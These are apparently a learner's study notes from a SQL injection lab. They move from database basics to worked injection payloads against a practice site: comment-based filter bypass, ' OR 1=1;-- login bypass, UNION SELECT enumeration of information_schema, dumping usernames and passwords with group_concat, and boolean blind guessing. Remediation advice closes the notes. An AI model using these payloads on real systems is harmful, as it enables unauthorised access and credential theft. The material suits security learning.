# SQL Injection


**Databases**

1. **What’s a Database?**
   - It’s like a digital filing cabinet that stores data in an organized way.
   - Tip: Think of it as a super tidy toy box for info.

2. **DBMS (Database Management System)**
   - The boss software that controls the database (e.g., MySQL, PostgreSQL).
   - Tip: It’s the librarian keeping everything in check.

3. **Tables**
   - Tables are like grids splitting data into columns (labels) and rows (actual info).
   - Example: A “shop” table might list product names (column) and details (rows).

4. **Columns (Fields)**
   - Labels at the top of the table, like “Price” or “Name,” with a set data type (number, text, etc.).
   - Tip: Think of them as name tags for each info type.

5. **Rows (Records)**
   - Each row is one piece of data, like one product or one customer.
   - Tip: Imagine adding a new toy to your collection—it gets its own row.

6. **Relational Databases**
   - Tables connect using unique IDs (keys), like linking customers to their orders.
   - Example: A “user ID” in one table matches orders in another.

7. **Non-Relational Databases (NoSQL)**
   - No tables—just flexible storage, like MongoDB.
   - Tip: Think of it as a big bag of mixed toys, not sorted boxes.

---


**SQL**

1. **What’s SQL?**
   - SQL (Structured Query Language) is a tool to talk to databases—like asking questions or giving orders.
   - Tip: Think of it as a librarian who fetches or changes info.

2. **SELECT**
   - Grabs data from a table. Example: `select * from users;` gets everything.
   - Tip: `*` is like saying “give me all the toys in the box.”

3. **WHERE**
   - Picks specific data. Example: `select * from users where username='admin';` finds just admin.
   - Tip: It’s like saying “only grab the red toys.”

4. **LIMIT**
   - Controls how many rows you get. Example: `select * from users LIMIT 1;` gives one row.
   - Tip: Think of it as “just one slice of pizza.”

5. **LIKE**
   - Finds matches with patterns. Example: `select * from users where username like 'a%';` gets usernames starting with ‘a’.
   - Tip: `%` is a wildcard—like “anything goes here.”

6. **UNION**
   - Combines results from two tables. Example: Mixes customers and suppliers into one list.
   - Tip: It’s like merging two toy piles into one.

7. **INSERT**
   - Adds new data. Example: `insert into users (username, password) values ('bob', 'password123');`
   - Tip: Think of dropping a new toy into the box.

8. **UPDATE**
   - Changes data. Example: `update users SET password='pass123' where username='admin';`
   - Tip: It’s like fixing a toy’s name tag.

9. **DELETE**
   - Removes data. Example: `delete from users where username='martin';`
   - Tip: Imagine tossing a toy out of the box.

---


**SQL Injection**

1. **What’s SQL Injection?**
   - It’s when sneaky user input messes with an SQL query to trick a database.
   - Tip: Think of it as slipping a fake note to the librarian.

2. **How It Looks**
   - Example: A blog URL like `https://website.thm/blog?id=1` grabs article ID 1.
   - Normal query: `SELECT * from blog where id=1 and private=0 LIMIT 1;` (only public articles).

3. **The Trick**
   - Change the URL to `https://website.thm/blog?id=2;--` to see private article ID 2.
   - New query: `SELECT * from blog where id=2;-- and private=0 LIMIT 1;` 
   - `--` makes the rest a comment, skipping the private check.
   - Tip: It’s like crossing out the “no entry” sign.

4. **Result**
   - Shows article 2, even if it’s private—bam, you’ve hacked it!
   - Tip: Small tweak, big access.

5. **Types**
   - This is “In-Band” SQL Injection (one of three: In-Band, Blind, Out-of-Band).
   - Tip: In-Band is like shouting your trick right at the database.

---



**SQL Injection**

1. **What’s SQL Injection?**
   - It’s when user input sneaks into an SQL query and breaks the rules.
   - Tip: Imagine someone slipping a cheat code into a game.

2. **Example Setup**
   - Blog URL: `https://website.thm/blog?id=1` shows article ID 1.
   - Query: `SELECT * from blog where id=1 and private=0 LIMIT 1;` (public only).

3. **The Hack**
   - Use `https://website.thm/blog?id=2;--` to see private article ID 2.
   - Query becomes: `SELECT * from blog where id=2;-- and private=0 LIMIT 1;`
   - `--` ignores the private check, showing the article anyway.
   - Tip: It’s like cutting the lock off a diary.

4. **Why It Works**
   - The ID from the URL goes straight into the query—oops, no safety check!
   - Tip: Think of it as trusting a stranger’s directions.

5. **Type**
   - This is “In-Band” SQL Injection (others: Blind, Out-of-Band).
   - Tip: In-Band is the loud, obvious trick.

   
---

**In-Band SQL Injection**

1. **What’s In-Band SQLi?**
   - It’s an easy SQL trick where you exploit and see results on the same page.
   - Tip: Like shouting a cheat code and hearing the answer right back.

2. **Error-Based SQLi**
   - Break the query with `'` or `"` to get error messages that spill database secrets.
   - Example: `id=1'` shows an error, proving the flaw.
   - Tip: Errors are like the database accidentally blabbing.

3. **Union-Based SQLi**
   - Use `UNION SELECT` to add extra data to the page.
   - Example: `1 UNION SELECT 1,2,3` tests columns; `0 UNION SELECT 1,2,database()` shows the database name.
   - Tip: It’s like sneaking extra toys into the display.

4. **Practical Steps**
   - Start with `id=1'` to spot the error.
   - Test `1 UNION SELECT 1,2,3` to match columns.
   - Use `0 UNION SELECT 1,2,database()` to get the database name (e.g., `sqli_one`).
   - Dig deeper with `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema='sqli_one'` for table names (e.g., `article, staff_users`).

5. **Finding Data**
   - Check table structure: `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='staff_users'` (e.g., `id, password, username`).
   - Grab data: `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users` to see usernames and passwords.
   - Tip: `group_concat` is like piling all the loot into one bag.

---


**Blind SQLi - Authentication Bypass**

1. **What’s Blind SQLi?**
   - It’s SQL injection where you don’t see results on screen—no errors, just guessing if it worked.
   - Tip: Like whispering a secret and hoping it unlocks something.

2. **Authentication Bypass**
   - Goal: Trick a login form to let you in without real username/password.
   - Tip: It’s like faking a “yes” to “are you allowed?”

3. **How It Works**
   - Normal query: `select * from users where username='bob' and password='bob123';` checks for a match.
   - Web app only cares if the database says “true” (match found).

4. **The Trick**
   - Use: Password field = `' OR 1=1;--`
   - Query becomes: `select * from users where username='' and password='' OR 1=1;`
   - `1=1` is always true, so the query says “yes,” and you’re in!
   - Tip: `--` ignores the rest, like cutting off extra rules.

5. **Practical**
   - In a login form, leave username blank, put `' OR 1=1;--` in password, and hit enter.
   - Tip: It’s a skeleton key for lazy login checks.

---


**Blind SQLi - Boolean Based**

1. **What’s Boolean-Based Blind SQLi?**
   - It’s SQL injection where you only get “true” or “false” answers—no direct data.
   - Tip: Like playing a yes/no guessing game with the database.

2. **How It Works**
   - Example: `https://website.thm/checkuser?username=admin` returns `{"taken":true}` (username exists).
   - Change to `admin123` and get `{"taken":false}` (not taken).
   - Tip: True/false is your only clue.

3. **Finding Columns**
   - Start with: `admin123' UNION SELECT 1;--` (false, too few columns).
   - Try: `admin123' UNION SELECT 1,2,3;--` (true, 3 columns match!).
   - Tip: Keep adding until “true” pops up.

4. **Guessing the Database Name**
   - Use: `admin123' UNION SELECT 1,2,3 where database() like 's%';--` (true if it starts with ‘s’).
   - Cycle letters: `sa%`, `sb%`, etc., until you get `sqli_three`.
   - Tip: It’s like guessing a word one letter at a time.

5. **Finding Tables**
   - Test: `admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' and table_name like 'u%';--`
   - Confirm: `users` table with `table_name='users'` (true).
   - Tip: Narrow it down with “like” guesses.

6. **Finding Columns**
   - Use: `admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'i%';--`
   - Cycle to find: `id`, `username`, `password`.
   - Tip: Exclude found ones (e.g., `and COLUMN_NAME!='id'`) to keep going.

7. **Grabbing Credentials**
   - Username: `admin123' UNION SELECT 1,2,3 from users where username like 'a%';--` (true for `admin`).
   - Password: `admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--` (cycle to `3845`).
   - Tip: Guess letter-by-letter until it fits.

---



**Out-of-Band SQLi**

1. **What’s Out-of-Band SQLi?**
   - It’s a rare SQL injection that uses two channels: one to attack, another to get results.
   - Tip: Like sending a spy in and getting secrets through a backdoor.

2. **How It Works**
   - Step 1: Attacker sends a sneaky SQL payload via a web request.
   - Step 2: Website runs the query with the payload.
   - Step 3: Payload makes the database ping the attacker’s server with stolen data (e.g., via HTTP/DNS).
   - Tip: It’s like tricking the database to mail you its secrets.

3. **Why It’s Rare**
   - Needs special database features or web app logic to make external calls.
   - Tip: Not every lock has this hidden keyhole.

---


**SQL Injection Remediation**

1. **Prepared Statements**
   - Write the SQL query first, then add user input as separate parameters.
   - Keeps the query safe and clear.
   - Tip: Like locking the recipe before adding ingredients.

2. **Input Validation**
   - Check user input—only allow specific stuff (e.g., letters, numbers).
   - Filter out bad characters with code tricks.
   - Tip: It’s like a bouncer at the door.

3. **Escaping User Input**
   - Add a `\` before risky characters (e.g., `'` becomes `\'`) so they’re treated as plain text.
   - Stops them from breaking or hacking the query.
   - Tip: Think of it as putting a leash on wild symbols.
